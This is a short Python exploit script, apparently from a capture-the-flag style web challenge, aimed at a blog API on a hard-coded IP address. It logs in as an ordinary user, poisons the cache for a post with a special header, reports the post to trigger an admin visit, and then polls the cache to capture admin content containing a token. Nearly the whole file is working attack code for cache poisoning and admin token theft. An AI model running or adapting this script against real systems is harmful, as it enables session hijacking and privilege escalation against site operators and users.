import requests
import time

SERVER_URL = "http://54.198.62.41"

def login_user(username="user", password="user123"):
    """Login and get token"""
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def test_admin_visit_exploit():
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    # Step 1: Set up cache poisoning for post 1
    print("\n[1] Setting up cache poison...")
    poison_headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Content-Type': 'text/html',  # Try to force HTML interpretation
        'Accept': 'text/html'
    }
    
    # Make the request to ensure it's cached
    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=poison_headers)
    print(f"Cache setup status: {r1.status_code}")
    print(f"Cache: {r1.headers.get('X-Cache-Debug')}")
    
    # Verify it's in cache
    time.sleep(1)
    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", 
                     headers={'X-Special-Key': 'secret_cache_key'})
    print(f"Cache verification status: {r2.status_code}")
    print(f"Cache hit: {r2.headers.get('X-Cache-Debug')}")

    # Step 2: Report the post to trigger admin visit
    print("\n[2] Triggering admin visit...")
    report_data = {"postId": 1}  # Use valid integer ID
    r3 = requests.post(
        f"{SERVER_URL}/api/blog/report",
        headers={'Authorization': f'Bearer {user_token}'},
        json=report_data
    )
    print(f"Report status: {r3.status_code}")

    # Step 3: Quick requests to try to catch admin response in cache
    print("\n[3] Attempting to catch admin response...")
    
    # Store seen responses to detect changes
    seen_responses = set()
    start_time = time.time()
    
    while time.time() - start_time < 10:  # Try for 10 seconds
        # Try different cache key variations
        for key in ['secret_cache_key', f'secret_cache_key_{int(time.time())}']:
            r = requests.get(
                f"{SERVER_URL}/api/blog/post/1",
                headers={
                    'X-Special-Key': key,
                    'Accept': 'text/html',
                }
            )
            
            content = r.text
            if content not in seen_responses:
                print(f"\nNew response found with key {key}!")
                print(f"Length: {len(content)}")
                print(f"Preview: {content[:200]}")
                seen_responses.add(content)
                
                # Check if we got admin content
                if 'admin' in content.lower() and 'token' in content.lower():
                    print("! Possible admin content found !")
                    print(f"Full response: {content}")
            
            time.sleep(0.2)

if __name__ == "__main__":
    print("[+] Starting admin visit exploitation...")
    test_admin_visit_exploit()  